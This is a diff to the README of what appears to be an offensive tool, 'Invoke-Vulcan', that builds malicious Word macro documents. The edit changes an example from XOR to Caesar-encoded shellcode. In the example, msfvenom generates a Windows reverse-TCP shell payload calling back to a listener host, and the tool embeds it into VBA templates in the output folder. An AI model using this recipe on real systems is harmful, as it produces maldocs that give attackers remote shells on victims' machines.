@@ -71,11 +71,11 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
-- Embed a `XOR`-encoded shellcode:
+- Embed a `Caesar`-encoded shellcode:
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -CaesarShift 5
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -CaesarShift 5
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
